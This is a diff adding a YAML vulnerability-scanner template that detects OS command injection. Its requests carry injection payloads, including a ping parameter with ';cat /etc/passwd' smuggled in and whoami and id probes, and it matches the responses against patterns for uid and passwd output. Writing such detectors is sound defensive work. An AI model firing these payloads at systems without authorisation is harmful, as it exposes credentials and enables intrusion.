@@ -1,0 +1,26 @@
+id: command-injection
+
+info:
+  name: Command Injection Detection
+  author: security-team
+  severity: critical
+  description: Detects OS command injection vulnerabilities
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-78
+  tags: injection,rce,command
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ping?host=127.0.0.1;cat /etc/passwd"
+      - "{{BaseURL}}/exec?cmd=whoami"
+      - "{{BaseURL}}/system?command=id"
+    
+    matchers:
+      - type: regex
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+          - "root:.*:0:0:"
+        part: body
